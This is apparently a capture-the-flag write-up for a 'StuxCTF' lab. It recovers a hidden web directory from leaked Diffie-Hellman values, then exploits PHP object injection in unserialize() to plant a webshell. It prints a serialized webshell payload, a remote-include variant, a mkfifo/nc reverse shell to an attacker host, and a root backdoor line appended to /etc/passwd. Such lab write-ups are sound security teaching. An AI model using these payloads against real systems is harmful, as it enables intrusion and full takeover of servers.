StuxCTF hides its real vulnerability behind a page that looks completely blank. Getting anywhere here means reading between the lines of an HTML comment, doing a bit of algebra, and only then finding the actual web app worth attacking.

## Reconnaissance

```bash
nmap -sS -sC -sV -O -n -p 22,80 <TARGET_IP> -oN nmap.txt
```

Just SSH and a web server. `robots.txt` is the first thing worth checking:

The room drops its own hint right there in a comment: `Diffie-Hellman`. It's telling me the algorithm before I've even seen any code.

## Finding the Hidden Directory

Requesting `/StuxCTF/` directly is a dead end:

```bash
curl -s http://<TARGET_IP>/StuxCTF/

404 Not Found
```

Not a real path, then — the hint is symbolic. The actual lead is sitting in the homepage's HTML source:

```bash
curl http://<TARGET_IP>

<html>
    <head><title>Default Page</title></head>
    <body>
        <!-- The secret directory is...
        p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
        g: 7;
        a: 330;
        b: 450;
        g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
        -->
        is blank....
    </body>
</html>
```

That's a Diffie-Hellman key exchange, dumped straight into an HTML comment.

The scheme here is 3-party, not the textbook 2-party version — Alice, Bob, and Carol. `a` and `b` are Alice's and Bob's private keys, leaked in plaintext. `g^c` is Carol's public key, which is supposed to be public anyway. With two of the three private exponents already in hand, there's no discrete log to solve — I just raise Carol's public value to the product of the two leaked private keys:

```python
shared_secret = pow(gc, a * b, p)   # = g^(a*b*c) mod p
directory_name = str(shared_secret)[:128]
```

The secret directory turns out to be the first 128 digits of that number:

```
47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
```

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET_IP>/4731502893.../

200
```

Directory confirmed. The real flaw here was never mathematical — the discrete log problem is still hard — it's that `a` and `b` never should have been printed anywhere in the first place.

## The Vulnerable Endpoint: PHP Object Injection

Inside the hidden directory, `?file=index.php` hands back its own source, hex-encoded, reversed, and base64'd:

```bash
curl -s "http://<TARGET_IP>/4731502893.../?file=index.php" > raw_hex.txt
sed 's/<!DOCTYPE.*//' raw_hex.txt > hex_only.txt
python3 -c "..."
```

```php
error_reporting(0);
class file {
    public $file = "dump.txt";
    public $data = "dump test";
    function __destruct(){
        file_put_contents($this->file, $this->data);
    }
}

$file_name = $_GET['file'];
if(isset($file_name) && !file_exists($file_name)){
    echo "File no Exist!";
}

if($file_name=="index.php"){
    $content = file_get_contents($file_name);
    $tags = array("", "");
    echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));
}
unserialize(file_get_contents($file_name));
```

The last line is the whole story: `unserialize(file_get_contents($file_name))`, with `$file_name` coming directly from `$_GET['file']`. That's PHP Object Injection. The `file` class has a `__destruct()` that writes `$data` to `$file` the moment the object gets garbage collected — no validation on either property. Control the serialized object, control what gets written where.

## Getting a Shell

The payload just needs to instantiate that class with a filename and a webshell as its properties:

{% raw %}
```python
filename = "shell.php"
webshell = '<?php system($_GET["cmd"]); ?>'
payload = f'O:4:"file":2:{{s:4:"file";s:{len(filename)}:"{filename}";s:4:"data";s:{len(webshell)}:"{webshell}";}}'
# O:4:"file":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```
{% endraw %}

The `php://input` wrapper lets me send that object in a POST body instead of needing a real file on disk:

```bash
curl -s -X POST ".../?file=php://input" -d 'O:4:"file":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}'
```

First attempt failed silently — I'd escaped the inner quotes with `\"` inside a curl `-d '...'` that was already single-quoted, and bash doesn't treat that backslash as an escape there. Those two extra characters threw off the declared length (`s:30`) against what PHP actually received, and `unserialize()` just quietly gave up. Dropping the escaping fixed it.

As an alternative, this is also exploitable via RFI instead of `php://input`: host the same serialized object on a local HTTP server and have the target fetch it remotely.

```bash
echo 'O:4:"file":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}' > object.txt
python3 -m http.server <ATTACKER_HTTP_PORT>
```

```bash
curl -s "http://<TARGET_IP>/4731502893.../?file=http://<ATTACKER_IP>:<ATTACKER_HTTP_PORT>/object.txt"
```

This route needs `allow_url_fopen` enabled on the target's PHP (it was), and for the target to be able to reach my IP over the network — not always viable. `php://input` doesn't depend on either condition, which is why it's the more reliable default.

Either way, `shell.php` ends up written to disk:

```bash
curl -s ".../shell.php?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s ".../shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+<ATTACKER_IP>+<ATTACKER_PORT>+>/tmp/f"
```

```bash
nc -lnvp <ATTACKER_PORT>

connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 58818
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Root

`sudo -l` is worth checking before doing anything more elaborate:

```bash
sudo -l

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
```

That's root, directly:

```bash
sudo su
id

uid=0(root) gid=0(root) groups=0(root)
```

Before spotting that, I'd already gone the long way round: `/etc/passwd` on this box is world-writable, which is its own valid path to root — append a line with UID/GID `0` and `su` into it.

```bash
ls -l /etc/passwd

-rwxrwxrwx 1 root root 1465 Aug  8  2019 /etc/passwd
```

```bash
openssl passwd -1 -salt xyz test123

<HASH_GENERATED>

echo 'hacker:<HASH_GENERATED>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

id

uid=0(root) gid=0(root) groups=0(root)
```

Linux identifies users by numeric UID, not by name — any account with `UID=0` is root, regardless of what it's called. Both routes get to the same place; `sudo -l` just makes it a one-liner.

## Key Takeaways

**A 2-party protocol assumption can hide a 3-party trap** — seeing more public values than a textbook exchange expects (here, a third public key alongside two supposedly-private ones) is itself the signal that the scheme has an extra participant.

**Silent failures in serialization are a shell-quoting problem in disguise** — a declared string length mismatch of just two characters, caused by escaping quotes that didn't need escaping, was enough to make `unserialize()` fail with no error at all.

**Multiple delivery mechanisms can reach the same vulnerable sink** — `php://input` and a self-hosted file over RFI both end up calling `file_get_contents()` on attacker-controlled input; the vulnerability is in what happens to that data afterward, not in how it arrives.
